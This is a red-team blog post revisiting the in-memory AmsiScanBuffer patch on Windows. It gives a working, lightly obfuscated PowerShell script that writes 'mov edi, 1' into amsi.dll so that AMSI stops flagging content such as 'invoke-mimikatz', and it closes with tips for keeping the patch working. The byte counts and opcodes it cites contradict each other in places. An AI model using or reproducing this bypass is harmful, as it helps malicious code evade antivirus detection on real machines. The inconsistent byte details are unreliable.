---
title: "Patching AMSI in 2025"
date: 2025-11-08 14:00:00 -0300
read_time: 5
tags: [amsi, windows, bypass, evasion, redteam, maldev, notes]
excerpt: "Revisiting the classic AmsiScanBuffer patch on a fresh Windows VM. The five-byte `xor edi, edi` flip no longer works on its own — there's an extra parameter check that takes a different code path. Two-byte change to `mov edi, 1` puts patching back on the menu."
---

I read an excellent post from R-Tec revisiting AMSI bypass techniques in 2025 ([link](https://lnkd.in/dNsMeXBx)) — a great survey of the state of play and whether simple in-process patching is still viable.

Eager to try it out, I spun up a fresh VM and dropped the classic PoC into PowerShell. It didn't behave as described — the string still got flagged.

![PowerShell session: AmsiScanBuffer patched but invoke-mimikatz still flagged as malicious]({{ '/assets/images/amsi-2025/bypass-blocked.png' | relative_url }})

`Este script contém conteúdo mal-intencionado e foi bloqueado pelo software antivírus.` — AV is still picking it up.

## Tracing the flow

With Ghidra and WinDbg I followed `AmsiScanBuffer` past the patch site and found an extra check on entry: the function validates `param_3` (the buffer size) and a couple of pointer fields, and when any of them is zero it returns `0x80070057` (`E_INVALIDARG`) — but on the way to that early-return there's an alternative path that still hands the buffer off to the scanner.

![Ghidra decompilation: parameter check returning 0x80070057 (E_INVALIDARG)]({{ '/assets/images/amsi-2025/ghidra-paramcheck.png' | relative_url }})

The classic patch zeroes `EDI` (`xor edi, edi`, two bytes) which makes the buffer length 0. With the new check, length-zero takes the alternative flow and the string still gets scanned. So zeroing the length isn't enough anymore.

## The fix

Instead of zeroing the length, set it to **1**. That dodges the new validation branch entirely, and a single-byte buffer is far too small for any real signature to match — the scanner returns clean.

The only change is the patch bytes: `mov edi, 1` (`BF 01 00 00 00`, five bytes) instead of `xor edi, edi`. The patch site is the same (`AmsiScanBuffer + 0x18`), and the `VirtualProtect` setup is unchanged.

```powershell
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
  [DllImport("kernel32")]
  public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
  [DllImport("kernel32")]
  public static extern IntPtr LoadLibrary(string name);
  [DllImport("kernel32")]
  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary(("{2}{1}{0}" -f "dll","si.","am"))
$Address     = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)

# mov edi, 1
$Patch   = [Byte[]] (0xBF, 0x01, 0x00, 0x00, 0x00)
$Address = [Int64]$Address + 0x18
$new     = [System.Runtime.InteropServices.Marshal]
$new::Copy($Patch, 0, $Address, 5)
```

After running it, `'invoke-mimikatz'` echoes back without tripping AV:

![PowerShell session: AmsiScanBuffer patched with mov edi, 1 — invoke-mimikatz no longer flagged]({{ '/assets/images/amsi-2025/bypass-working.png' | relative_url }})

## Closing thoughts

I don't know whether the parameter-check is an intentional mitigation or just new code that happened to land in `AmsiScanBuffer` — either way, swapping two bytes (`0x29 0xFF` → `0xBF 0x01 0x00 0x00 0x00`) keeps the patch alive in 2025.

If patching is on your radar:

- **The patch site moves.** Don't hardcode `+0x18` indefinitely; verify against your build of `amsi.dll`.
- **Length-zero is no longer free.** Pick a value that satisfies the new validation but is still useless to the scanner — `1` is the cheapest.
- **AMR/EDR layers still see the call.** Patching `AmsiScanBuffer` only blinds AMSI; the userland tracer in your EDR likely still hooks something else.

Long live patching.
